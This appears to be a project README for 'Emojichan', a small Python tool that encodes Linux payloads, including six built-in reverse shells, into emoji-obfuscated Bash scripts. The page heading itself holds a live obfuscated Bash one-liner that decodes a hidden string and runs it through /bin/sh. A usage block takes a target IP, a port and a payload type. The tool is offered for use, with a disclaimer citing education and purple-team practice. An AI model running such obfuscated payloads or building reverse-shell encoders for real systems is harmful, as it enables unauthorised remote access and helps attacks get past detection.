<h1>Emojichan ~(=^β₯^)_ζ¦~</h1>
<h5>π°(){ /??r/??n/?r?nt? ${@};};πΊ(){ π° ${#};};β(){ /??n/?h -c "${@}";};z=$(π° "\\`πΊ β``πΊ π§ͺ π§ͺ π§ͺ π§ͺ``πΊ π£ π£ π£ π£ π£`\\`πΊ π£``πΊ π₯ π₯ π₯ π₯``πΊ π° π° π°`\\`πΊ π±``πΊ π± π± π± π± π±``πΊ`\\`πΊ π§``πΊ π» π» π» π» π»``πΊ π΅ π΅ π΅ π΅ π΅ π΅ π΅`\\`πΊ β β β β``πΊ`\\`πΊ π π π π``πΊ π· π·`\\`πΊ π±``πΊ π‘``πΊ`\\`πΊ β£``πΊ πΈ πΈ πΈ πΈ``πΊ π°`\\`πΊ πΈ``πΊ β» β» β» β»``πΊ β» β» β»`\\`πΊ π΅``πΊ πΆ πΆ πΆ πΆ πΆ``πΊ π§ π§ π§`\\`πΊ π§¨ π§¨ π§¨ π§¨``πΊ`\\`πΊ π``πΊ πΎ πΎ``πΊ π π π π`\\`πΊ π±``πΊ π§¨ π§¨ π§¨ π§¨ π§¨``πΊ`\\`πΊ πΈ``πΊ π π π π``πΊ πΈ πΈ πΈ πΈ πΈ`\\`πΊ π½ π½ π½ π½``πΊ`\\`πΊ β``πΊ π· π·``πΊ`\\`πΊ π½``πΊ γ γ γ γ γ``πΊ π£ π£ π£ π£`\\`πΊ π¦ ``πΊ π» π» π» π»``πΊ π§¨`\\`πΊ π``πΊ β  β  β  β  β ``πΊ β’ β’ β’ β’ β’ β’`\\`πΊ π``πΊ β  β  β  β ``πΊ π½ π½ π½ π½ π½`\\`πΊ π¦ ``πΊ π₯ π₯ π₯ π₯ π₯ π₯``πΊ π± π± π± π±`\\`πΊ π π π π``πΊ π‘`\\`πΊ π π π π``πΊ β£ β£`\\`πΊ π π π π π π π``πΊ π¦  π¦  π¦ `");β "${z}";</h5><br>
<pre>
[m4x@lab:~]$ ./emojichan.py
Usage: ./emojichan.py {IP address} {Port} {Output Filename} {Payload Type}
-- --> ./emojichan.py {Payload File} {Output Filename}
Payloads available: awk, bash, perl, python, socat, php
</pre>

Uh-oh, here we go, back at it again...πΆπ»π

Emojichan is an emoji-obfuscator tool for Linux based payloads. It comes with 6 baked-in reverse shell variants which are encoded using its own algorithm. Weighing in at a mere 79 lines of Python3, Emojichan will take any file/payload and encode its contents into a Bash-based script which will attempt to execute whatever it was provided. A word of caution on that last tid-bit. It prefers oneliners; we all got'em. Use this script to not only encode your payload once, but as many times as your heart desires. β€οΈ β€οΈ β€οΈ β€οΈ β€οΈ 

This project is super new and will likely be updated frequently. While the script is simple enough for anyone reading it to augment and improve upon, the Wiki will be updated with fun examples and a breakdown of how Emojichan does its stuff.

Like any tool related to Offensive Security engineering and practice, this script is intended for educational purposes and πΎPurple Team mayhemπ. Please use responsibly and respectfully.
